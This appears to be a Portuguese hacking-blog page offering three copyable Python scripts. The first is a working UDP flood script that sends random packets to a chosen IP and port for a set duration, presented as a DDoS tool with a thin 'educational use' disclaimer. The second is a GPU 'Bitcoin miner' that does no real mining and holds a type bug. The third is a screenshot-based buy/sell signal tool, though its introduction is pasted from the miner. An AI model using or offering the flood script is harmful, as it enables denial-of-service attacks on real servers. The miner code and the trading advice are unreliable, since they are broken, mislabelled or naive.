<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Scripts - Storm Central</title>
    <style>
        /* Estilos gerais */
        body {
            background: linear-gradient(to right, #0f0c29, #302b63, #24243e);
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 0;
            cursor: url('https://cur.cursors-4u.net/user/use-4/use352.cur'), auto;
            transition: background-color 0.5s ease-in-out;
        }
        body:hover {
            background-color: #111111;
        }

        /* Header */
        header {
            text-align: center;
            padding: 20px;
            border-bottom: 2px solid #00ff00;
            background: #1f1c3c;
            color: #00ff00;
        }
        header h1 {
            font-size: 3rem;
            margin: 0;
            text-shadow: 0 0 10px #66ff66;
        }
        header p {
            font-size: 1.2rem;
            color: #66ff66;
        }

        /* Menu de navega√ß√£o */
        nav {
            background: #1b1a33;
            border-bottom: 2px solid #00ff00;
            padding: 10px 0;
        }
        nav ul {
            list-style-type: none;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            gap: 15px;
        }
        nav ul li {
            margin: 0;
        }
        nav ul li a {
            text-decoration: none;
            color: #00ff00;
            font-weight: bold;
            padding: 10px 20px;
            border: 2px solid #00ff00;
            border-radius: 10px;
            transition: all 0.3s;
        }
        nav ul li a:hover {
            background: #66ff66;
            color: #0f0c29;
            text-shadow: 0 0 5px #0f0c29;
            box-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
        }

        /* Se√ß√£o principal */
        main {
            padding: 20px;
        }
        .scripts {
            background: rgba(15, 12, 41, 0.8);
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #00ff00;
            border-radius: 10px;
            box-shadow: 0 0 15px #00ff00;
        }
        .scripts h2 {
            color: #66ff66;
            text-shadow: 0 0 10px #66ff66;
        }
        .script-content {
            background-color: #0b0b0b;
            padding: 10px;
            border-radius: 5px;
            overflow-x: auto;
            position: relative;
            box-shadow: 0 0 15px #00ff00;
            margin-bottom: 20px;
        }
        .scripts textarea {
            width: 100%;
            height: 200px;
            background-color: #0b0b0b;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            padding: 10px;
            border: 1px solid #00ff00;
            border-radius: 5px;
            margin-bottom: 10px;
            resize: none;
        }
        .scripts button {
            background: linear-gradient(135deg, #0b0b0b, #00ff00);
            color: #0b0b0b;
            border: 1px solid #00ff00;
            padding: 10px 20px;
            border-radius: 20px;
            font-size: 1.2rem;
            cursor: pointer;
            transition: all 0.3s ease-in-out;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
        }
        .scripts button:hover {
            background: linear-gradient(135deg, #00ff00, #66ff66);
            color: #0b0b0b;
            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.3);
        }

        .copy-button {
            margin-top: 10px;
            background: linear-gradient(135deg, #0b0b0b, #00ff00);
            border: 1px solid #00ff00;
            padding: 10px 20px;
            border-radius: 10px;
            font-size: 1.2rem;
            cursor: pointer;
            transition: all 0.3s ease-in-out;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
            color: #0b0b0b;
        }
        .copy-button:hover {
            background: linear-gradient(135deg, #00ff00, #66ff66);
            color: #0b0b0b;
            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.3);
        }

        /* Rodap√© */
        footer {
            text-align: center;
            padding: 10px;
            background: #1f1c3c;
            color: #00ff00;
            border-top: 2px solid #00ff00;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <header>
        <h1>Minhas Scripts</h1>
        <p>Uma cole√ß√£o das minhas cria√ß√µes de c√≥digo e scripts √∫teis.</p>
    </header>
    <nav>
        <ul>
            <li><a href="index.html">Home</a></li>
            <li><a href="sobre.html">Sobre</a></li>
            <li><a href="scripts.html">Scripts</a></li>
            <li><a href="contato.html">Contato</a></li>
        </ul>
    </nav>
    <main>
        <div class="scripts">
            <center><h2>Minhas Scripts</h2></center>
            <p>// Essa script faz um ataque DDoS b√°sico, enviando pacotes para um IP e porta espec√≠ficos pelo tempo determinado. Lembre-se de usar essa script somente para fins educativos e √©ticos. Usar ferramentas como essa para prejudicar outros √© ilegal e contra os princ√≠pios de hacking √©tico que a gente valoriza! //</p>
            <div class="script-content">
                <textarea readonly id="script1">
import socket
import random
import time
import argparse

# Fun√ß√£o para gerar pacotes de dados aleat√≥rios
def generate_packet(size):
    return random._urandom(size)

def dos_attack(ip, port, size, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = generate_packet(size)
    
    timeout = time.time() + duration
    sent = 0

    while time.time() < timeout:
        client.sendto(bytes_to_send, (ip, port))
        sent += 1
        print(f"Pacotes enviados: {sent} para {ip} na porta {port}")

    print(f"Ataque finalizado. {sent} pacotes enviados.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script de DDoS em Python - STORM")
    parser.add_argument("ip", type=str, help="Endere√ßo IP de destino")
    parser.add_argument("port", type=int, help="Porta de destino")
    parser.add_argument("size", type=int, help="Tamanho dos pacotes")
    parser.add_argument("duration", type=int, help="Dura√ß√£o do ataque (segundos)")

    args = parser.parse_args()

    dos_attack(args.ip, args.port, args.size, args.duration)
                </textarea>
                <center><button class="copy-button" onclick="copyScript('script2')">üìã Copiar Script</button></center>
                <h3>üñ•Ô∏è Descri√ß√£o do Script de Ataque DDoS em Python üñ•Ô∏è</h3>
                <h3>üõ†Ô∏è Recursos:</h3>
<li><strong>Gerador de Pacotes Aleat√≥rios: Cria pacotes de dados aleat√≥rios para o ataque.</strong></li>

<li><strong>Execu√ß√£o do Ataque DDoS: Envia os pacotes para o endere√ßo IP e porta especificados.</strong></li>

<li><strong>Controle de Dura√ß√£o: Define a dura√ß√£o do ataque em segundos.</strong></li>
<li>Configura√ß√£o por Linha de Comando: Permite definir IP, porta, tamanho dos pacotes e dura√ß√£o do ataque via argumentos da linha de comando.</li>
<h3><strong>‚ö†Ô∏è Nota Importante:
Use este script apenas para fins educativos e √©ticos. Atacar servidores sem permiss√£o √© ilegal e contra os princ√≠pios do hacking √©tico. üö´</strong></h3>


            </div>
            <br>
            <h1>___________________________________________________________________</h1>

<br>
        <p>// Este script em Python utiliza a biblioteca PyOpenCL para minerar Bitcoin (BTC) usando a GPU. Ele configura a conex√£o com uma pool de minera√ß√£o üéõÔ∏è e calcula hashes de dados aleat√≥rios üìä, aproveitando o poder de processamento da GPU üéÆ. Embora seja uma simula√ß√£o simplificada, √© ideal para fins educativos sobre minera√ß√£o de criptomoedas üíª. //
</p>
            <div class="script-content">
                <textarea readonly id="script2">import hashlib
import numpy as np
import pyopencl as cl
import time

# Configura√ß√µes da pool de minera√ß√£o e carteira
POOL_URL = "stratum+tcp://pool_address:port"
WALLET_ADDRESS = "your_bitcoin_wallet_address"

# Configura√ß√£o da plataforma e dispositivo OpenCL
platform = cl.get_platforms()[0]
device = platform.get_devices()[0]
context = cl.Context([device])
queue = cl.CommandQueue(context)

# Kernel para minera√ß√£o de BTC
kernel_code = """
__kernel void miner(__global const char* data, __global char* result) {
    int id = get_global_id(0);
    // L√≥gica simples de hashing (para fins educacionais)
    char hash[64];
    for (int i = 0; i < 64; ++i) {
        hash[i] = data[i] ^ id;
    }
    // Armazenar o resultado
    for (int i = 0; i < 64; ++i) {
        result[i] = hash[i];
    }
}
"""

program = cl.Program(context, kernel_code).build()
data = np.random.bytes(64).encode('utf-8')
result = np.zeros(64, dtype=np.uint8)

# Buffer
data_buffer = cl.Buffer(context, cl.mem_flags.READ_ONLY | cl.mem_flags.COPY_HOST_PTR, hostbuf=data)
result_buffer = cl.Buffer(context, cl.mem_flags.WRITE_ONLY, result.nbytes)

# Tamanho do trabalho
global_size = (64,)

# Executar o kernel
while True:
    start_time = time.time()
    cl.enqueue_copy(queue, data_buffer, data)
    program.miner(queue, global_size, None, data_buffer, result_buffer)
    cl.enqueue_copy(queue, result, result_buffer)
    queue.finish()
    end_time = time.time()
    print(f"Hash calculado: {hashlib.sha256(result).hexdigest()} em {end_time - start_time} segundos")

# Enviar hash para a pool (pseudo-c√≥digo)
# send_to_pool(result)
</textarea>
<center><button class="copy-button" onclick="copyScript('script2')">üìã Copiar Script</button></center>
  <center><h3> üíª Descri√ß√£o do Script de Minera√ß√£o de BTC üíª</h3></center>
  <p><center>
   
<h3>üõ†Ô∏è Recursos:</h3>
<li><strong>Acesso √† GPU para c√°lculos paralelos üöÄ</strong></li>

<li><strong>Conex√£o com uma pool de minera√ß√£o üåê</strong></li>

<li><strong>Minera√ß√£o de Bitcoin com hashes de dados aleat√≥rios üß©</strong></li>



</center></p>
<h3>‚ö†Ô∏è Nota:
Minera√ß√£o real de BTC com GPUs n√£o √© eficiente em compara√ß√£o com ASICs dedicados.</h3>


                

            </div>
            <h1>___________________________________________________________________</h1>

       <br>
        <p>// Este script em Python utiliza a biblioteca PyOpenCL para minerar Bitcoin (BTC) usando a GPU. Ele configura a conex√£o com uma pool de minera√ß√£o üéõÔ∏è e calcula hashes de dados aleat√≥rios üìä, aproveitando o poder de processamento da GPU üéÆ. Embora seja uma simula√ß√£o simplificada, √© ideal para fins educativos sobre minera√ß√£o de criptomoedas üíª. //
</p>
            <div class="script-content">
                <textarea readonly id="script2">import hashlib
import cv2
import numpy as np
import mss
import matplotlib.pyplot as plt
from PIL import Image
from scipy.signal import find_peaks

def capture_screen():
    with mss.mss() as sct:
        monitor = sct.monitors[1]  # Captura o monitor principal
        screenshot = sct.grab(monitor)
        img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
        return np.array(img)

def extract_prices_from_image(img):
    # Converter para escala de cinza
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)

    # Definir a regi√£o de interesse (ROI) na parte inferior da imagem
    height, width = gray.shape
    roi_height = int(height * 0.2)  # Usar os 20% inferiores da imagem
    roi = gray[height - roi_height:height, :]

    # Aplicar threshold para destacar os elementos do gr√°fico
    _, thresh = cv2.threshold(roi, 200, 255, cv2.THRESH_BINARY_INV)

    # Encontrar contornos
    contours, _ = cv2.findContours(thresh, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)

    # Filtrar contornos por √°rea para remover ru√≠do
    min_area = 50
    filtered_contours = [cnt for cnt in contours if cv2.contourArea(cnt) > min_area]

    # Extrair os pontos mais baixos de cada contorno (assumindo que representam os pre√ßos)
    price_points = []
    for cnt in filtered_contours:
        lowest_point = tuple(cnt[cnt[:,:,1].argmax()][0])
        price_points.append(lowest_point)

    # Ordenar os pontos da esquerda para a direita
    price_points.sort(key=lambda x: x[0])

    # Converter os pontos em uma s√©rie de pre√ßos
    prices = [height - p[1] for p in price_points]  # Inverter a coordenada y

    # Normalizar os pre√ßos
    if prices:
        min_price, max_price = min(prices), max(prices)
        prices = [(p - min_price) / (max_price - min_price) * 100 for p in prices]

    # Suavizar os pre√ßos para remover ru√≠do
    prices = np.convolve(prices, np.ones(5)/5, mode='valid')

    return prices

def calculate_sma(prices, window):
    return np.convolve(prices, np.ones(window), 'valid') / window

def analyze_chart(prices, short_window=5, long_window=20):
    # Calcular m√©dias m√≥veis
    sma_short = calculate_sma(prices, window=short_window)
    sma_long = calculate_sma(prices, window=long_window)

    # Plot para visualiza√ß√£o
    plt.figure(figsize=(10, 5))
    plt.plot(prices, label='Pre√ßo')
    plt.plot(range(short_window-1, len(sma_short) + short_window-1), sma_short, label=f'SMA Curta ({short_window})')
    plt.plot(range(long_window-1, len(sma_long) + long_window-1), sma_long, label=f'SMA Longa ({long_window})')
    plt.title('An√°lise de M√©dias M√≥veis')
    plt.xlabel('Tempo')
    plt.ylabel('Pre√ßo Normalizado')
    plt.legend()
    plt.grid()
    plt.show()

    # L√≥gica de compra/venda
    if sma_short[-1] > sma_long[-1]:
        return "Comprar"
    else:
        return "Vender"

if __name__ == "__main__":
    img = capture_screen()
    prices = extract_prices_from_image(img)
    decision = analyze_chart(prices)
    print(f"Decis√£o: {decision}")

</textarea>
<center><button class="copy-button" onclick="copyScript('script2')">üìã Copiar Script</button></center>
  <center><h3> Este script em Python captura a tela, extrai dados de pre√ßos de um gr√°fico e os analisa usando m√©dias m√≥veis. Ele fornece uma recomenda√ß√£o de compra ou venda com base na an√°lise dos pre√ßos. Ideal para automa√ß√£o da an√°lise de gr√°ficos de pre√ßos em tempo real. üìàüñ•Ô∏è</h3></center>
  <p><center>
   
<h3>üõ†Ô∏è Recursos:</h3>
<li><strong>Acesso √† captura de tela do monitor üñ•Ô∏è</strong></li>

<li><strong>Extra√ß√£o de pre√ßos de gr√°ficos a partir de imagens üñºÔ∏è</strong></li>

<li><strong>Convers√£o de imagens para escala de cinza e aplica√ß√£o de threshold üé®</strong></li>
<li><strong>Filtragem de contornos para remover ru√≠do e identificar pontos de pre√ßo üìâ</strong></li>
<li><strong>Normaliza√ß√£o e suaviza√ß√£o dos dados de pre√ßos para an√°lise üìä</strong></li>
<li><strong>Plotagem dos pre√ßos e m√©dias m√≥veis para visualiza√ß√£o gr√°fica üìà üßÆ</strong></li>
<li><strong>C√°lculo de m√©dias m√≥veis simples (SMA) üßÆ</strong></li>
<li><strong>Fornecimento de recomenda√ß√µes de compra ou venda com base na an√°lise üîç</strong></li>




</center></p>
<h3>‚ö†Ô∏è Nota:
Este script n√£o garante 100% de precis√£o nas recomenda√ß√µes de compra ou venda. Ele deve ser utilizado como uma ferramenta auxiliar e n√£o como uma substitui√ß√£o para an√°lises financeiras detalhadas ou conselhos de especialistas. Os resultados podem variar com base na qualidade das capturas de tela e nas caracter√≠sticas espec√≠ficas dos gr√°ficos analisados. Utilize com discernimento e verifique os dados antes de tomar decis√µes financeiras. üìäüìà.</h3>


                

            </div>
            <h1>___________________________________________________________________</h1>
            
       
        </div>
        </div>
    </main>

    <footer>
        <p>¬© 2024 Hacking Blog | Powered by StormCentral</p>
    </footer>
    <script>
        function copyScript(scriptId) {
            var scriptText = document.getElementById(scriptId).value;
            navigator.clipboard.writeText(scriptText).then(function() {
                alert("Script copiada!");
            }, function(err) {
                alert("Erro ao copiar[_{{{CITATION{{{_1{](https://github.com/edsyang/blog/tree/2ce48a2788db8d4f4b5f5f5dc8c388799ea5c0c2/docs%2Fcourse%2Fvue%2F13-Vue.js-D.part%20four.md)[_{{{CITATION{{{_2{](https://github.com/waladahlmzaqi/portfoliopwpb/tree/1441b97ce3a2e804cd73879d3e0c6007e70fdd18/admin%2Findex.php)[_{{{CITATION{{{_3{](https://github.com/EWCMF/laravel-cloudstorage/tree/eb9f382563b4faaa619fb988fa37705013a8d38d/resources%2Fviews%2Flayouts%2Fapp.blade.php)
